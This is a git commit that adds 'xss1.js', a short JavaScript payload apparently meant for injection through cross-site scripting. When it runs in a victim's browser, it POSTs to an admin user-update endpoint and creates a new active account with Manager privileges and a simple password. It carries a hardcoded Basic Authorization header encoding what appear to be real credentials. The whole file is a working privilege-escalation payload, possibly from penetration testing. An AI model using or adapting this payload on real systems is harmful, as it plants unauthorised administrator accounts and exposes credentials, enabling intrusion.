11b7468f487fdb121b23e87c90813d9322878d75
prasanthpror <75009718+prasanthpror@users.noreply.github.com>
2024-12-18 15:21:52 +0530

    Create xss1.js

---
+++ xss1.js
@@ -0,0 +1,8 @@
+fetch('/admin/ajax-user-update', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Authorization': 'Basic b25lc2hpZnQ6S28jMGY5QGdvbDBLUzY3bQ=='
+  },
+  body: 'mode=add&uid=0&active=1&name=test&mobile=98989898&email=r.prasanth+xssadmin@appsecure.security&password=123456&user_mgt=Manager&telesales=Manager&purchaser=Manager&direct_sales=Manager&consignment_cst=Manager&assignable=0&c2b_rr=1'
+});
